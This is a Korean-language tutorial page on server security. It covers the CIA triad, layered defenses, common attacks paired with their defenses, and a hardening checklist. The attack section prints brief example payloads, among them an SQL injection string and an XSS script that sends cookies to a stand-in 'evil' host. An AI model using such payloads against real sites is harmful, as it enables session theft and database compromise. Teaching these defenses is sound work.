01.서버 보안

서버 보안은 서비스의 안정성을 보장하는 방어 체계입니다. 하나의 장치로 모든 공격을 막을 수는 없기 때문에, 네트워크부터 데이터베이스까지 여러 겹의 방어 계층을 두고 데이터의 기밀성 · 무결성 · 가용성을 지킵니다.

// 보안의 3요소 — CIA Triad

  • C 기밀성 Confidentiality

    허가된 사람만 정보를 볼 수 있어야 합니다.

    암호화 · 접근 통제 · 인증
  • I 무결성 Integrity

    정보가 허가 없이 변경되지 않아야 합니다.

    해시 · 전자서명 · 입력 검증
  • A 가용성 Availability

    필요할 때 언제든 서비스를 쓸 수 있어야 합니다.

    이중화 · 백업 · DDoS 대응

// 다층 방어 — Defense in Depth

  1. L1 사용자 브라우저 요청
  2. L2 네트워크 방화벽 · IPS/IDS
  3. L3 전송 구간 HTTPS · TLS 암호화
  4. L4 웹 애플리케이션 WAF · 입력 검증 · 세션 관리
  5. L5 데이터베이스 최소 권한 · 암호화 · 백업

// 대표적인 공격과 방어

  • SQL InjectionHIGH

    ATTACK입력창에 SQL 구문을 끼워 넣어 DB를 조회 · 변조합니다.

    ' OR '1'='1' --

    DEFENSEPrepared Statement 로 입력값을 데이터로만 처리하고, 입력값을 검증합니다.

  • XSSHIGH

    ATTACK게시글 등에 스크립트를 심어 다른 사용자의 브라우저에서 실행시킵니다.

    <script>fetch('//evil?c='+document.cookie)</script>

    DEFENSE출력 시 HTML 이스케이프, CSP 헤더, 쿠키에 HttpOnly 설정.

  • Brute ForceMID

    ATTACK비밀번호를 무작위로 계속 대입해 계정을 탈취합니다.

    for pw in wordlist: login("admin", pw)

    DEFENSE로그인 시도 횟수 제한, fail2ban 차단, 2단계 인증(MFA).

  • DDoSMID

    ATTACK대량의 트래픽을 한꺼번에 보내 서비스를 마비시킵니다.

    GET / × 1,000,000 req/s

    DEFENSECDN · 트래픽 필터링, 요청 수 제한(Rate Limit), 서버 이중화.

// 서버 운영 보안 체크리스트

  • 침입 방지 시스템(IPS/IDS) 운용
  • SSL/TLS 암호화 통신 적용 (HTTP → HTTPS 리다이렉트)
  • 최소 권한 원칙의 계정 관리
  • 불필요한 포트 · 서비스 비활성화
  • OS · 패키지 보안 패치 정기 적용
  • 접속 로그 모니터링과 정기 백업
